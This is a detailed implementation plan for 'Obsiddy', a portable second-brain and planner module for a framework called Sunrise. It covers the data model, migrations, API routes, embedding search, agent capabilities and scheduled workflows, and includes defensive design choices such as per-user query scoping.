# Obsiddy — Implementation Plan

## Context

Build an agentic second brain / planner on the Sunrise template: capture random thoughts all day, know your projects and your aims at week/month/year/life horizons, surface connections between projects in the background, and help decide what to actually do next.

Nothing productivity-shaped exists in the repo yet — `prisma/schema/app.prisma` holds only `ContactSubmission`, `FeatureFlag`, `AuthBootstrap`, and `lib/framework/` does not exist. This is greenfield, built on the fork tiers Sunrise reserves for exactly this.

**Obsiddy is a framework-tier module**, not a leaf-fork feature — it must be installable into other Sunrise-based projects. That constraint shapes every path in this plan and is set out before the architecture, below.

**Requirements captured in conversation:** full system (not a thin slice); multi-user-safe from day one but no team UI; capture from web, phone/PWA, email and chat; **two-way Obsidian vault sync** across zip / git / cloud-drive transports plus a "start a new vault" mode; per-item privacy with **both** named grants and public read-only links; the owner's own agent sees all of the owner's items regardless of visibility; task pinning and snoozing; archival of aged and obsolete data; clients and market segments as first-class nodes; upload of reference documents for embedding; a force-directed graph view; on-demand idea generation.

**Delivery:** four releases (§15). **Release 1 is a complete no-Obsidian build** — the whole second brain, no vault, no new dependencies, no credential storage. Obsidian arrives in Releases 3 and 4. Sections 12 and 13 below therefore describe work that is designed now but built later; read them for the constraints they place on Release 1's schema, not as immediate scope.

### The Obsidian question, answered

**Postgres + pgvector is the store. Obsidian is a co-equal editing surface synced against it.** Not either/or.

Obsidian cannot be the system of record here, because the things you asked for are queries a folder of markdown cannot answer: ranking tasks by a weighted score, nearest-neighbour search over embeddings, scheduled background jobs that run whether or not your laptop is open, and per-item access grants. Sunrise already ships the machinery for all four.

But markdown files are the right _interchange_ format, and since you want this usable by other people, Obsidian round-tripping is a genuine product feature — an on-ramp, an off-ramp, and a daily editing surface for people who already live in a vault.

Note this is the single most expensive decision in the plan. Two-way sync across three transports is roughly as much work as the entire rest of the system. It is sequenced so you get a shippable product long before you get all three transports.

### What Sunrise gives you for free

| Need                       | Existing                                                          | Path                                                 |
| -------------------------- | ----------------------------------------------------------------- | ---------------------------------------------------- |
| Embeddings                 | `embedText` / `embedBatch`, active-model resolution, cost logging | `lib/orchestration/knowledge/embedder.ts`            |
| Hybrid vector+BM25 search  | `runHybridSearch` SQL pattern to copy                             | `lib/orchestration/knowledge/search.ts`              |
| Agent tools                | `BaseCapability`, `registerAppCapability`                         | `lib/orchestration/capabilities/`                    |
| Background jobs            | maintenance tick, 8 tasks under `Promise.allSettled`              | `lib/orchestration/maintenance/run-tick.ts`          |
| Multi-agent planning       | `orchestrator` step (planner recruits agents per round)           | `lib/orchestration/engine/executors/orchestrator.ts` |
| Email-to-inbox             | Postmark inbound adapter                                          | `lib/orchestration/inbound/adapters/postmark.ts`     |
| Per-turn context injection | `registerContextContributor` → `=== LOCKED CONTEXT ===` block     | `lib/orchestration/chat/context-builder.ts`          |
| Sharing precedent          | single read choke point, `revokedAt`/`expiresAt`                  | `lib/orchestration/access/conversation-access.ts`    |
| GDPR erasure               | `registerErasureCleanupHook`                                      | `lib/privacy/erasure-hooks.ts`                       |

### Verified facts that changed the design

- **No encryption utility exists.** Zero hits for `createCipheriv|aes-256|kms` across `lib/`, `app/`, `scripts/`. `AiWorkflowTrigger.signingSecret` is plaintext under a documented "the DB is admin-trusted" posture — a norm that does not survive user-owned third-party tokens. Per-user credential storage is **new infrastructure**.
- **`checkSafeProviderUrl` is in `lib/security/safe-url.ts`**, not `url-fetcher.ts`, and does **no DNS resolution** — a real gap for 100%-user-supplied git remotes.
- **`AiWorkflowSchedule` has no per-user notion** (`createdBy` only). Vault sync rides the maintenance tick, not the workflow scheduler.
- **No zip, YAML or server-side markdown library is a declared dep.** `jszip`/`adm-zip`/`js-yaml` exist transitively via `mammoth`/`epub2` — must not be free-ridden on.
- `app/robots.ts` does not disallow a share prefix today. `next.config.js` sets `X-Frame-Options: DENY` for `/(.*)` unconditionally.
- Global upload cap is 5 MB (`lib/validations/storage.ts:15`); the bulk knowledge route defines its own 50 MB / 10-file limits locally.

---

## Portability — Obsiddy is a framework-tier module

**Working title: Obsiddy.** The requirement that this be droppable into other Sunrise-based projects changes where every file lives, so it belongs here rather than as an afterthought.

`CUSTOMIZATION.md:70-80` reserves **two** fork tiers, and the plan was aimed at the wrong one:

| Tier             | For                                                         | Owns                                                                                                           |
| ---------------- | ----------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| `/app` (leaf)    | fork Sunrise, build one product                             | `lib/app/**`, `.context/app/`, `prisma/schema/app.prisma`                                                      |
| **`/framework`** | **a reusable layer between Sunrise and its own leaf forks** | **`lib/framework/`, `.context/framework/`, `prisma/schema/framework-*.prisma`, the `framework_` table prefix** |

Obsiddy is the second. **Sunrise core never creates files or tables under either tier**, so both merge cleanly on upgrade — that guarantee is the whole point, and it only holds if we stay inside the tier.

### Placement

| Concern    | Path                                                           |
| ---------- | -------------------------------------------------------------- |
| Code       | `lib/framework/obsiddy/**`                                     |
| Schema     | `prisma/schema/framework-obsiddy.prisma`                       |
| Tables     | `framework_obsiddy_*` (e.g. `@@map("framework_obsiddy_task")`) |
| Docs       | `.context/framework/obsiddy/**`                                |
| Seeds      | `prisma/seeds/framework-obsiddy/001-*.ts` onward               |
| Routes     | `app/(protected)/obsiddy/**`, `app/api/v1/obsiddy/**`          |
| Components | `components/obsiddy/**`                                        |

**Namespaced inside the tier, not at its root.** `prisma/schema/framework-*.prisma` is a _glob_, so several framework modules coexist. A project already running another framework layer (Daybreak, say) can add Obsiddy as a sibling — `lib/framework/daybreak/` and `lib/framework/obsiddy/` — rather than colliding on the tier root. Never put anything directly in `lib/framework/` except the tier's own `eslint.config.mjs`.

### Seed numbering — the earlier plan was wrong

An earlier draft said "seeds start at 021, since `020-agent-initial-versions.ts` is the current max." That's host-specific and breaks the moment Obsiddy is installed anywhere else.

`.context/database/seeding.md:66-70` resolves it: the runner discovers seeds **recursively**, and `SeedHistory` keys on the path **relative to `prisma/seeds/`** — so `framework-obsiddy/001-capabilities` cannot collide with a host's own `001-*`. Obsiddy numbers **from 001 inside its own directory**. Ordering is also free: digit-prefixed core seeds run before letter-prefixed subdirectories, so Obsiddy's seeds land after Sunrise's.

### The three core-file edits must become seams

The plan currently requires editing three Sunrise-owned files. For a one-off product that's a footnote; for a portable module it's poison — every host project would have to repeat them, and each is an upstream merge conflict waiting to happen.

| Core edit                                                            | Fix                                                                                                                                                                                                                                 |
| -------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `lib/orchestration/maintenance/run-tick.ts` (vault sweep, retention) | **Add `lib/app/maintenance-tasks.ts`** (`registerAppMaintenanceTask({name, run})`, ~30 lines) and upstream it. Was "recommended"; for a portable module it is **required**                                                          |
| `components/layouts/protected-nav.tsx` (one nav entry)               | No seam exists — `lib/app/admin-nav.ts` covers admin nav only. **Upstream a matching `lib/app/protected-nav.ts`.** Until then it's one documented line in the install guide                                                         |
| `app/robots.ts` (`/s/` disallow)                                     | **Don't require it.** Per-page `robots` metadata plus `X-Robots-Tag` on the API route are the stronger controls anyway (robots.txt is advisory and doesn't de-index). Ship those; list the robots.txt line as an optional host step |

### Boot, env and lint wiring

- **Boot.** `instrumentation.ts` calls `initApp()` in `lib/app/bootstrap.ts`. Obsiddy is booted from there with a **dynamic** import — `await import('@/lib/framework/obsiddy')`. `CUSTOMIZATION.md:281` is explicit that a _static_ framework specifier is resolved at `next build` and **breaks the build in any fork without that folder**. Obsiddy's boot then delegates to a fresh leaf hook (`lib/app/leaf-bootstrap.ts`) so a project building on Obsiddy can still hook boot without fighting over `bootstrap.ts`.
- **Env.** `appEnvSchema` in `lib/app/env.ts` is the _leaf_ seam. Obsiddy exports `obsiddyEnvSchema` from its tier and the host merges it in one line, rather than Obsiddy owning a file the host also wants.
- **Lint.** Obsiddy's import boundary (`lib/framework/obsiddy/repo/*` must not import `…/access/*`, D5) lives in `lib/framework/eslint.config.mjs`, which the root config spreads **before** the leaf seam. Remember flat-config `no-restricted-imports` **replaces rather than merges** — any block Obsiddy adds must restate the base `@/`-alias ban for its glob or relative-import enforcement silently dies there.
- **Registrations.** Every `lib/app/*.ts` seam Obsiddy needs (`capabilities`, `context-contributors`, `protected-routes`, `db-drift`, `rate-limit`, `admin-nav`) is a **leaf** file. Obsiddy exports a ready-made contribution from its tier and the install guide is one import plus one spread per seam — never "paste this body in".

### Obsiddy exposes its own seams

A framework tier owns `/framework` and **re-exposes `/app` to its leaf forks**. So Obsiddy must be extensible by the projects that install it:

`lib/app/obsiddy.ts` (Obsiddy-owned, host-editable) — register extra capabilities on the Obsiddy agents, add board column presets, contribute swimlane dimensions, extend the priority weights, add entity kinds. Without this, the first host project that wants a tweak forks Obsiddy and portability dies at install #2.

### Install guide

`.context/framework/obsiddy/install.md` is a deliverable, not documentation debt: the migration to apply, the seed directory to copy, the one-line-per-seam registrations, the env vars, the optional robots.txt line, and the `npm run db:drift-check` verification. **Phase 0 writes it; every later phase keeps it current.** A portable module that can't be installed from a checklist isn't portable.

### What this costs

Roughly a day of extra plumbing, all in phases 0–1, plus the discipline of never reaching for a core file. In exchange, upgrading Sunrise underneath Obsiddy is a clean merge, and installing Obsiddy into project #2 is a checklist rather than an archaeology exercise.

---

## Architecture — the five decisions everything else follows from

**D1 — One satellite table, everything else hangs off it.** `ObsiddySpace` carries `userId String @unique` with a hand-written FK to `"user"("id") ON DELETE CASCADE`. Every other `framework_obsiddy_*` table carries `userId` relating to `ObsiddySpace.userId` with `onDelete: Cascade`. One unmodelled FK to drift-probe instead of a dozen; `userId` natively on every row for scoped queries; erasure cascades transitively. Never add columns to `User` (CLAUDE.md).

**D2 — Typed entity tables + one polymorphic edge table + one polymorphic embedding table.** Tasks/projects/goals have different required fields and different query shapes, so no generic node graph. But _connections_ are polymorphic (`ObsiddyLink`) and _embeddings_ are polymorphic (`ObsiddyEmbedding`) — which means one `vector(1536)` column, one HNSW index, one re-embed path, one search query. Cuts the pgvector migration-drift surface ~5×.

**D3 — Prioritisation is deterministic code, not an LLM.** Pure function in `lib/framework/obsiddy/priority/score.ts`, persisted to `priorityScore`, so list endpoints are one indexed `ORDER BY` with zero per-request compute. The LLM chooses among the top ~10 and writes rationales; it never produces a number that lands in the column.

**D4 — Connection-finding is embedding-to-embedding, not LLM-over-corpus.** The background sweep reads _already-stored_ vectors and does nearest-neighbour pairs in SQL at zero token cost. An LLM writes rationales only for pairs clearing the similarity floor. This is what makes proactive background connection-hunting affordable to run forever.

**D5 — Every brain query is either an owner query or a shared query. There is no third kind.** Owner queries are `WHERE userId = $1` with no joins and no resolution. Shared queries opt in explicitly and go through `resolveObsiddyAccess`. Enforced structurally: `lib/framework/obsiddy/repo/*` takes an `OwnerScope` and _cannot express_ a cross-user read; cross-user code lives in `lib/framework/obsiddy/access/*`. **Adopt this before sync or sharing exist** — retrofitting it is what causes leaks.

---

## 1. Data model — `prisma/schema/framework-obsiddy.prisma`

All tables `@@map("obsiddy_*")`, all with `userId` and a `@@index([userId, …])` leading with `userId`.

| Model                  | Purpose                            | Notes                                                                                                                                                                                                                                                                                                                                                                                                                               |
| ---------------------- | ---------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ObsiddySpace`         | one row per user                   | `inboxToken @unique` (email routing), `timezone`, `weeklyCapacityMinutes`, `energyProfile Json`, `priorityWeights Json`, `retentionPolicy Json` (§11), **`workStyle`** = `structured\|balanced\|exploratory` (default `balanced`, see §6). **The only table needing an FK drift probe.**                                                                                                                                            |
| `ObsiddyArea`          | life domains (Health, Career…)     | `targetWeeklyMinutes` — this is what makes it a _life_ organiser, not a task list                                                                                                                                                                                                                                                                                                                                                   |
| `ObsiddyGoal`          | horizons                           | `horizon` = `life\|year\|quarter\|month\|week`, `parentGoalId` self-relation `SetNull`, `areaId SetNull`                                                                                                                                                                                                                                                                                                                            |
| `ObsiddyProject`       |                                    | `status`, `areaId SetNull`, `priorityScore`, `lastActivityAt`, `snoozedUntil`                                                                                                                                                                                                                                                                                                                                                       |
| `ObsiddyTask`          |                                    | `projectId` **`SetNull`** (deleting a project must not destroy tasks — they fall back to inbox), `dueAt`, `deferUntil`, `estimateMinutes`, `energy`, `contextTag`, `priorityScore`, `priorityFactors Json`, `manualBoost Float @default(0)` + `manualBoostExpiresAt DateTime?` + `manualBoostReason String?` (§10). `deferUntil` doubles as snooze; `snoozeCount Int @default(0)` + `lastSnoozedAt` (§10). Generated `searchVector` |
| `ObsiddyThought`       | capture inbox                      | `source` = `web\|pwa\|voice\|image\|shortcut\|email\|chat\|agent\|api`, `externalId` for replay dedupe (`@@unique([userId, externalId])`), `snoozedUntil`, `snoozeCount`, `lastSnoozedAt`                                                                                                                                                                                                                                           |
| `ObsiddyLink`          | polymorphic edge                   | `sourceType/sourceId/targetType/targetId/kind/strength/rationale/origin/status`, `snoozedUntil`, `@@unique` on the tuple. No FKs to targets                                                                                                                                                                                                                                                                                         |
| `ObsiddyEmbedding`     | the one vector table               | `entityType/entityId/chunkIndex`, `embedding vector(1536)`, generated `searchVector`, `contentHash`, model provenance                                                                                                                                                                                                                                                                                                               |
| `ObsiddyBoard`         | a named, shareable kanban view     | `name`, `slug` (`@@unique([userId, slug])`), `columns Json` (ordered list of `{status, label, wipLimit?}`), `membership` = `filter\|explicit`, `filter Json?`, `swimlaneBy?` (`project\|area\|entity\|none`), `visibility`, `archivedAt`. See §12                                                                                                                                                                                   |
| `ObsiddyBoardCard`     | explicit board membership          | `boardId`, `taskId`, `position Float`. Only used when `membership: 'explicit'`. `@@unique([boardId, taskId])`                                                                                                                                                                                                                                                                                                                       |
| `ObsiddyTag`           | Trello-style coloured labels       | `name`, `slug` (`@@unique([userId, slug])`), `colour`, `sortOrder`. A table, not a `String[]` — see §12                                                                                                                                                                                                                                                                                                                             |
| `ObsiddyTaskTag`       | task ↔ tag join                    | `@@unique([taskId, tagId])`, `@@index([tagId])`                                                                                                                                                                                                                                                                                                                                                                                     |
| `ObsiddyChecklistItem` | sub-steps within a card            | `taskId` (`onDelete: Cascade`), `text`, `isDone`, `position Float`, `completedAt?`. `@@index([taskId, position])`                                                                                                                                                                                                                                                                                                                   |
| `ObsiddyEntity`        | people, companies, market segments | `name`, `slug` (`@@unique([userId, slug])`), `kind` = `person\|company\|segment`, `description Text?`, `website?`, `status`, `lastActivityAt`, `snoozedUntil`, `indexedHash`. **First-class, not an Area** — see below                                                                                                                                                                                                              |
| `ObsiddyDocument`      | uploaded reference material        | `title`, `fileName`, `fileHash`, `mimeType`, `storageKey`, `byteSize`, `status` = `processing\|ready\|failed`, `chunkCount`, `sourceUrl?`, `errorMessage?`, `extractedText Text?`. Chunks land in `ObsiddyEmbedding` with `chunkIndex`                                                                                                                                                                                              |
| `ObsiddyTimeBlock`     | planned/actual time                | feeds `effortFit` and the "organise my time" requirement                                                                                                                                                                                                                                                                                                                                                                            |
| `ObsiddyReview`        | generated artefacts                | how background workflows persist output the UI can render                                                                                                                                                                                                                                                                                                                                                                           |
| `ObsiddyEvent`         | append-only activity log           | the weekly review needs "what actually moved"; scanning `updatedAt` across five tables is the wrong answer                                                                                                                                                                                                                                                                                                                          |

**Embedded types:** `thought`, `project`, `goal`, `area`, `entity`, `document`. **Not `task`** — titles are short, high-churn and semantically thin; a tsvector on the task table gives better recall for less money.

**Why `ObsiddyEntity` is not just an Area.** An Area is a _domain of your life_ with a weekly time target, and `areaBalance` (§10) deliberately floats neglected ones upward. A client is not that — balancing attention across customers the way you balance Health against Career is wrong, and overloading Areas would corrupt the scorer. Entities are therefore a separate node type that is **deliberately absent from `score.ts`**; neglected clients surface through the stale digest (§11), not by inflating task scores. This is what makes "what should we do for Acme this quarter?" the same connection query as everything else, just pointed at a different node.

**Entities and documents connect via `ObsiddyLink`, not FK columns.** A project can serve several clients; a document can be relevant to several projects. Adding `entityId` to `ObsiddyProject` would force a primary-client fiction and give the codebase two relationship mechanisms. The edge table already handles polymorphic many-to-many — use it (D2).

Fields the later subsystems force onto the base model, added now to avoid a retrofit:

- `rev Int @default(0)` on the six syncable entities, bumped in the same UPDATE as every write. Without it, "did the DB change?" costs a full re-render of every row per sync tick. `updatedAt` is not a substitute — it moves on writes that don't change the rendered doc.
- `visibility String @db.VarChar(16) @default("private")` on `ObsiddyArea`/`ObsiddyGoal`/`ObsiddyProject`/`ObsiddyReview`/`ObsiddyTask`/`ObsiddyBoard`, `@@index([userId, visibility])`. Values `private | link`. Comment the column: **`visibility` is never a filter on the owner's own read path.**
- `ObsiddyLink.origin` gains `'vault'`; `status` gains `'proposed'` for prose-derived mentions.
- `archivedAt DateTime?` + `archivedReason String?` on `ObsiddyArea`/`ObsiddyGoal`/`ObsiddyProject`/`ObsiddyTask`/`ObsiddyThought`/`ObsiddyReview`/`ObsiddyEntity`/`ObsiddyDocument`, with `@@index([userId, archivedAt])`. **Every default query gains `archivedAt: null`** — put it in the `lib/framework/obsiddy/repo/*` base filter, not in each call site. See §11.
- **`ObsiddyEvent` must never carry an email address** — store `granteeUserId` or a hash. An email in the owner's log survives the grantee's erasure.

---

## 2. Migration strategy

One migration `add_second_brain`, generated `--create-only` then **hand-edited** — the repo's baseline uses this convention with `A1`/`A2` annotations tying each raw object to a drift probe.

1. `CREATE EXTENSION IF NOT EXISTS "vector";`
2. Replace Prisma's plain tsvector columns with `GENERATED ALWAYS AS (to_tsvector('english', …)) STORED` on `framework_obsiddy_embedding.searchVector` and `framework_obsiddy_task.searchVector`.
3. `CREATE INDEX idx_framework_obsiddy_embedding_hnsw … USING hnsw (embedding vector_cosine_ops) WITH (m = 16, ef_construction = 64)` plus GIN indexes on both tsvectors. Copy parameters from `idx_knowledge_embedding` in the baseline.
4. Hand-written FK: `ALTER TABLE framework_obsiddy_space ADD CONSTRAINT framework_obsiddy_space_userId_fkey FOREIGN KEY ("userId") REFERENCES "user"("id") ON DELETE CASCADE;` (User is mapped to lowercase `"user"`).

**The drift trap.** Every future `migrate dev` emits DROPs for all five raw-SQL objects plus the FK, and a dropped HNSW index degrades _silently_ to seq-scan with no error. Two mandatory mitigations:

- Copy the `⚠️ PRISMA-SCHEMA DRIFT WARNING ⚠️` comment-block convention from `prisma/schema/orchestration-knowledge.prisma:85-117` onto `ObsiddyEmbedding` and `ObsiddyTask`.
- Register six probes in `lib/app/db-drift.ts` via `registerAppDriftProbe` + `constraintExists`/`indexExists`/`columnExists` from `lib/db/drift-probes` — including a definition assertion that the FK really is `ON DELETE CASCADE` (that one is the GDPR guard). `npm run db:drift-check` then fails CI the moment any is dropped. **This is the highest-value regression guard in the build.**

**Orphans** for the FK-less polymorphic tables: a transactional `lib/framework/obsiddy/services/delete-entity.ts` (entity + its embeddings + its links in one `$transaction`), plus a `pruneObsiddyOrphans(userId)` sweep in the nightly workflow.

---

## 3. API surface — `app/api/v1/obsiddy/**`

All `withAuth`, `validateRequestBody`, `successResponse`, thrown errors from `lib/api/errors.ts`, `getRouteLogger`. Zod schemas in `lib/framework/obsiddy/validations.ts`. Copy the route pair at `app/api/v1/admin/feature-flags/route.ts` + `[id]/route.ts`.

**Handlers stay thin; all logic lives in `lib/framework/obsiddy/services/*.ts` so capabilities call the same functions the HTTP routes do.** Non-negotiable — otherwise agent writes and UI writes diverge.

Enriched single-call endpoints (CLAUDE.md forbids N+1 client fetches):

| Endpoint                | Returns in ONE call                                                                                                                                                                                      |
| ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `GET /obsiddy/today`    | ranked tasks (+project, +area, +factors), today's time blocks, inbox count, goals at risk, unreviewed links, latest review. ETag'd via `computeETag`/`checkConditional`. **The dashboard's only fetch.** |
| `GET /obsiddy/inbox`    | thoughts + `suggestedLinks[]` + `suggestedProjectId`, resolved with one grouped query                                                                                                                    |
| `GET /obsiddy/projects` | + `openTaskCount`, `nextAction`, `linkedGoals[]`, `daysSinceActivity`, `priorityScore`                                                                                                                   |
| `GET /obsiddy/tasks`    | + project, area, score, factors; paginated + sortable                                                                                                                                                    |
| `GET /obsiddy/goals`    | full tree nested by `parentGoalId` + linked counts                                                                                                                                                       |

Mutations: `POST /obsiddy/capture`, CRUD pairs for thoughts/tasks/projects/goals/areas/entities/time-blocks, `POST /obsiddy/thoughts/[id]/promote`, `GET/POST /obsiddy/links` + `PATCH /obsiddy/links/[id]`, `GET /obsiddy/search`, `POST /obsiddy/reindex`, `GET/PATCH /obsiddy/space`, `GET /obsiddy/reviews`, `POST /obsiddy/chat/stream`.

Boards (§12): `GET/POST /obsiddy/boards`, `GET/PATCH/DELETE /obsiddy/boards/[id]`, `GET /obsiddy/boards/[id]/view` (**the board's only fetch** — columns, cards enriched with tags + checklist progress + aging, WIP state, swimlane groupings), `POST /obsiddy/boards/[id]/cards` + `PATCH /obsiddy/boards/[id]/cards/[taskId]` (reorder within an explicit board), `POST /obsiddy/boards/[id]/snapshot` (filter → explicit), `GET /obsiddy/boards/[id]/export?format=csv|json`. Tags: `GET/POST /obsiddy/tags`, `PATCH/DELETE /obsiddy/tags/[id]`. Checklists: `POST /obsiddy/tasks/[id]/checklist`, `PATCH/DELETE /obsiddy/checklist/[itemId]`.

A card drag issues **one** `PATCH /obsiddy/tasks/[id]` carrying the new `status` and, where relevant, `manualBoost` — not a status call followed by a reorder call. Optimistic UI locally, single round trip on the wire.

Also: `GET /obsiddy/entities` (enriched — linked projects, open task count, days since activity), `GET /obsiddy/entities/[id]` (the client dashboard: everything linked to them, plus suggested connections), `POST /obsiddy/documents` (multipart upload), `GET /obsiddy/documents`, `DELETE /obsiddy/documents/[id]`, `POST /obsiddy/ideate`, and `GET /obsiddy/graph?focus=<type>:<id>&depth=1` returning `{ nodes[], edges[] }` — see §9.

Rate limiting: `/api/v1/**` already inherits 100/min via `proxy.ts`. Add sub-caps for the embedding-heavy `/obsiddy/capture` and `/obsiddy/reindex` via `registerRateLimitRule` in `lib/app/rate-limit.ts` (keep matchers pinned to `/api/v1/obsiddy/…`; the helper throws if a matcher could shadow a Sunrise surface).

---

## 4. Semantic layer

**`lib/framework/obsiddy/embedding/indexer.ts`** — `canonicalText(entityType, row)`, `enqueueReindex()` (nulls `indexedHash`), `reindexPending(userId, limit)` which batches through `embedBatch(texts, 100, 'document')` and records model/provider/dimension exactly like `AiKnowledgeChunk`. Called fire-and-forget after capture (bounded, try/catch, never blocks the response), from the nightly workflow, and from `POST /obsiddy/reindex`. Compute the hash from **semantic content only**, never rendered markdown.

**`lib/framework/obsiddy/search/hybrid-search.ts`** — `searchObsiddy({ userId, query, entityTypes?, limit, threshold })`, copying `runHybridSearch` from `lib/orchestration/knowledge/search.ts`. `e."userId" = $N` is always the first WHERE condition and always a **bound parameter**, never interpolated; make it structurally impossible to omit by having `searchObsiddy` be the only export and `userId` a required field. Hydrate results batched by type, one `findMany` per type. **Port `assertActiveModelMatchesStoredVectors()`** against `framework_obsiddy_embedding.embeddingDimension` — without it a model swap becomes a cryptic SQL cast crash.

**`lib/framework/obsiddy/search/connections.ts`** — `findConnections()` reads the source row's _stored_ vector and orders by `<=>` over the same user's other entities, excluding self and existing links. `sweepConnections(userId)` runs it across projects, goals, entities **and thought-to-thought pairs**, writing `ObsiddyLink{ origin:'rule', status:'suggested', strength }` above a 0.72 floor. Zero embedding cost.

**Thought-to-thought is where article and podcast ideas come from** — two half-formed fragments captured six weeks apart that turn out to be the same idea. Projects and goals are already well-formed, so their collisions are less surprising. Cap the thought pass to the last 180 days of non-archived thoughts or the pair count grows quadratically.

**`lib/framework/obsiddy/documents/ingest.ts`** — reuses the platform parsers wholesale. `parseDocument(buffer, fileName)` from `lib/orchestration/knowledge/parsers/` already handles PDF, DOCX, EPUB, CSV, HTML, TXT and MD; `chunkMarkdownDocument()` and `chunkBySemanticBreakpoints()` from `lib/orchestration/knowledge/chunker.ts` do the splitting. `ingestDocument()` stores the file via `lib/storage`, parses, chunks, writes `ObsiddyEmbedding` rows with `entityType: 'document'` and an incrementing `chunkIndex`, then flips `status: 'ready'` and sets `chunkCount`. Dedupe on `fileHash` like the platform's `documentManager` does.

**Do not route uploads through the platform knowledge base.** `.context/orchestration/knowledge.md` states plainly that the KB is a global asset and per-user scoping is an anti-pattern. Same parsers, same chunker, app-owned tables — that is the whole distinction, and it keeps your documents inside the `WHERE userId = $1` invariant (D5).

Uploads reuse the bulk route's own guards, which are stricter than the 5 MB global default in `lib/validations/storage.ts`: a pre-parse `content-length` check before `formData()` materialises the body, an extension allowlist, and `MAX_TEXT_LINES` / `MAX_LINE_LENGTH` caps. Copy them from `app/api/v1/admin/orchestration/knowledge/documents/bulk/route.ts` rather than re-deriving.

---

## 5. Agent layer

### Capabilities — `lib/framework/obsiddy/capabilities/*.ts`

Each extends `BaseCapability`, sets `processesPii = true` and **overrides `redactProvenance`** (the registry refuses to register otherwise). Shared guard `requireObsiddyUser(context)` throws if `context.userId` is absent. **No capability accepts `userId` as an LLM-supplied argument** — one deliberate exception in §8.

`obsiddy_capture` · `obsiddy_search` · `obsiddy_list_tasks` · `obsiddy_upsert_task` · `obsiddy_upsert_project` · `obsiddy_upsert_goal` · `obsiddy_upsert_entity` · `obsiddy_link_entities` · `obsiddy_find_connections` (idempotent) · `obsiddy_get_snapshot` · `obsiddy_write_review` · `obsiddy_reprioritise` (runs the deterministic ranker; the LLM can trigger but never supplies scores) · `obsiddy_ideate`.

`obsiddy_search` takes `entityTypes[]`, so documents and entities are searchable through the existing tool — no separate document-search capability.

**`obsiddy_ideate({ seedType, seedId, angle?, count? })`** is the deliberate counterpart to the passive sweep. The nightly job _notices_ connections; this is you asking for them: it pulls the seed's nearest neighbours across all embedded types, then asks the LLM for N distinct framings — article angles, podcast topics, campaign ideas for a client. Read-only: it returns suggestions and writes nothing. Without it the system only ever surfaces connections on its own schedule, which is a filing cabinet rather than a thinking partner.

Four-step pipeline each: TS class → `registerAppCapability` in `lib/app/capabilities.ts` → `AiCapability` seed row → `AiAgentCapability` binding. Model seeds on `prisma/seeds/011-call-external-api.ts` (upsert by slug; the update branch only sets `isSystem` so re-seeding never clobbers admin edits). **Seed numbering starts at 021** — `020-agent-initial-versions.ts` is the current max.

### Agents to seed

`obsiddy-companion` (conversational face, temp 0.4) · `obsiddy-triage` (nightly inbox processor, temp 0.1) · `obsiddy-connector` (writes connection rationales, temp 0.6 — this one wants divergence) · `obsiddy-strategist` (reviews, goal alignment, capacity, temp 0.3) · **`obsiddy-judge`** (`kind: 'judge'`, temp 0.0 — the agent `obsiddy-horizon-check`'s `judge_call` step actually calls; §6 used the step without seeding its target).

All five share a seeded **`obsiddy-core` `AiAgentProfile`** carrying the persona and guardrails, with each agent setting `guardrailsMode: 'append'` and keeping only its own `systemInstructions` (§7). All `knowledgeAccessMode: 'restricted'` — the global KB is not the user's notes. Guard modes set explicitly rather than left at defaults, `citationGuardMode` on especially (§7).

### Context contributor — "always knows my goals"

`lib/framework/obsiddy/context/contributor.ts` → `registerContextContributor('obsiddy', loadObsiddyContext)` in `lib/app/context-contributors.ts`. The loader **ignores `id` and reads `request.userId`**, returning `''` if absent — a shared cache partition must never leak another user's goals.

Contents, in order, each section truncated: today's date + timezone + week number; life & year goals; current month + week goals with target dates; active projects with next action and days-since-activity; top 5 tasks with dominant factor; inbox backlog, remaining capacity, most-neglected area. **Hard-cap at ~1200 tokens** — this is injected on _every_ turn and otherwise grows unbounded. Every mutating service calls `invalidateContext('obsiddy', userId, { userId })`.

### App-owned chat route

`app/api/v1/obsiddy/chat/stream/route.ts`. Needed because the consumer route deliberately drops `contextType`/`contextId` and the admin route requires `withAdminAuth`. Uses `withAuth`, calls `streamChat()` directly, and pins `contextId: session.user.id` **server-side** — never client-supplied. Reuse `sseResponse` from `lib/api/sse.ts`. Confirmed: `streamChat` itself doesn't gate on `AiAgent.visibility` (the route does), so `obsiddy-companion` can stay `internal`.

---

## 6. Background intelligence

Workflows seeded as `AiWorkflow` rows + `createInitialVersion`, following `prisma/seeds/004-builtin-templates.ts`. Schedules are **per-user rows** created by `ensureObsiddySchedules(userId)` when a `ObsiddySpace` is first created.

**The userId mechanism (verified):** `processDueSchedules` stamps `execution.userId = schedule.createdBy` (`scheduler.ts:314`), and the engine threads that into `CapabilityContext.userId` (`executors/tool-call.ts:102`). So one schedule row per user with `createdBy = userId` is exactly how a background workflow acts on the right person's data, with no userId ever in an LLM-visible argument.

| Workflow                    | Cron         | Steps                                                                                                                        |
| --------------------------- | ------------ | ---------------------------------------------------------------------------------------------------------------------------- |
| `obsiddy-nightly-triage`    | `15 3 * * *` | reindex → `agent_call obsiddy-triage` → `obsiddy_reprioritise` → daily review → **pre-compute tomorrow's briefing** → notify |
| `obsiddy-connection-finder` | `0 4 * * 0`  | deterministic sweep (free) → **`orchestrator`** → connections review → notify                                                |
| `obsiddy-weekly-review`     | `0 16 * * 5` | snapshot → `llm_call` (moved / stalled / at risk vs month+quarter goals) → `reflect` → review → notify                       |
| `obsiddy-horizon-check`     | `0 9 1 * *`  | snapshot → `llm_call` → `judge_call` scoring each goal 0–1 on evidenced activity → `guard` flags < 0.3 → month review        |
| `obsiddy-capture-intake`    | inbound      | `obsiddy_capture_for_token` → `agent_call obsiddy-triage` single-thought mode                                                |

### Morning briefing — the one on-demand workflow

Press a button, get: **what you've actually finished recently**, and **what's worth doing today**. Everything else in §6 runs on a schedule; this one is the user-triggered exception.

**Pre-compute it, don't generate on the button.** Waiting 20 seconds after pressing a button is a bad experience, and the data barely changes between 3am and 8am. `obsiddy-nightly-triage` writes the briefing as its last step; the button serves the stored `ObsiddyReview{horizon: 'briefing'}` **instantly**. Regeneration happens only if the stored one is older than 18 hours (the nightly run failed) or you explicitly ask. Show the generated-at time, so a stale briefing looks stale rather than lying quietly.

